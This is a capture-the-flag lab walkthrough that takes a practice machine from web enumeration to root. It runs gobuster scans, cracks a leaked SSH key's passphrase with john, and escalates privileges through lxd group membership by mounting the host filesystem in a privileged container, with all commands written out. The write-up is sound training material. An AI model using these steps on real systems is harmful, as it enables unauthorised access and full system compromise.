# Enumeration
We start our autorecon scan, which quickly reveals ports 22 and 80 as being open.

![a36c842083704ad69fc54f4c460fdb44.png](./_resources/a36c842083704ad69fc54f4c460fdb44.png)

We follow up with some nmap scans for confirmation and further details.

![ce66084ec830f7c252d9a7e0cf841210.png](./_resources/ce66084ec830f7c252d9a7e0cf841210.png)

![7aea1d256906aed4b83feba4a020bf01.png](./_resources/7aea1d256906aed4b83feba4a020bf01.png)

We'll use gobuster to search for any interesting directories. We'll run the following commands; the first uses a much shorter list.

`gobuster dir -u http://10.10.88.246 -w /usr/share/dirb/wordlists/common.txt -x .txt,.html`

`gobuster dir -u http://10.10.88.246 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,.html`

While gobuster is running, let's take a look at the web server.

![cc30416a5329f65784c6511382ef2410.png](./_resources/cc30416a5329f65784c6511382ef2410.png)

Looking around, we find an `/uploads` page which contains a dictionary file. This seems like a password list, so let's save the contents to a `passwords.txt` file.

![e115c09626e7bf48a998eb0adc0077d1.png](./_resources/e115c09626e7bf48a998eb0adc0077d1.png)

If we look at the source code of the homepage, we find a possible username in a comment.

![312bd07608bcaeef49f8c1bfb639147a.png](./_resources/312bd07608bcaeef49f8c1bfb639147a.png)

Going back to our gobuster scan results, we find a `/secret` directory containing a secret key, which appears to be a private ssh key.

![da3afdc9af6e56bfd7d1643b2dc5710e.png](./_resources/da3afdc9af6e56bfd7d1643b2dc5710e.png)

Let's download it and try to use it to ssh into the machine with the user we found. 
<br>

# Exploitation
Now let's gain initial access using the key we found. First use `chmod 600 secretKey` to ensure the key has the correct permissions set for ssh. Trying to ssh into the machine using `ssh -i secretKey john@10.10.88.246` greets us with a password prompt.

![26b0ae344178e0560d153c86998883ed.png](./_resources/26b0ae344178e0560d153c86998883ed.png)

So it seems we need a password in order to use the key we found. Let's use john to try and crack the password using the wordlist we found. First, we'll use ssh2john to convert the key into a file compatible with john: `ssh2john secretKey > secretKey.txt`. Now run john with `john --wordlist=passwords.txt secretKey.txt`. After a few seconds, we get the password. Note that we can use `john --show secretKey.txt` to print the password we cracked again.

![3c2f711113b571e2e5898b2a6553eb3e.png](./_resources/3c2f711113b571e2e5898b2a6553eb3e.png)

From here, we get initial access which we can use to read the `user.txt` flag.

![81f6b8f4a42cf69c20ffd616efe4abd9.png](./_resources/81f6b8f4a42cf69c20ffd616efe4abd9.png)

![1583340199405cc6be38ef67c5c6a524.png](./_resources/1583340199405cc6be38ef67c5c6a524.png)
<br>

# Post-Exploitation
Let's look for possible privesc methods. Using `id`, we can we john's user and group information.

![d3944f5f8794869920f55a180c04afe4.png](./_resources/d3944f5f8794869920f55a180c04afe4.png)

A bit of Googling tells us we can exploit the fact that john belongs to the `lxd` group.  LXD refers to a container management system for Linux Containers; [this](https://www.hackingarticles.in/lxd-privilege-escalation) page gives a brief explanation, and also describes the exploit we will use. The exploit can also be found on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.

Our first step will be to build an Alpine Linux image on the attacking machine. We use:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

This produces a tar.gz file in the current directory.

![23458f87df707ecdd02a3290f2a918ff.png](./_resources/23458f87df707ecdd02a3290f2a918ff.png)

Next, host a web server with `python3 -m http.server` and download the tar.gz file on the target machine. We then add the Alpine image as an image to LXD using:

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz
```

We can verify that this worked using `lxc image list`.

![54ebdd545d0ad5aae5cf0ff43f674f11.png](./_resources/54ebdd545d0ad5aae5cf0ff43f674f11.png)

Now we run the following sequence of commands to create a container using the image.

```bash
lxc init <image fingerprint> ignite -c security.privileged=true
lxc config device add ignite <image fingerprint> disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![dcdabbccaf8003754314eafed2a231a1.png](./_resources/dcdabbccaf8003754314eafed2a231a1.png)

It looks like we have root privileges within the container! Let's use `cd /mnt/root` to navigate to the file system, since this is where it is mounted. We then `cd` into `/root`, where we find the `root.txt` flag.

![0962c9a4915335f41beb70e4ac5e81f2.png](./_resources/0962c9a4915335f41beb70e4ac5e81f2.png)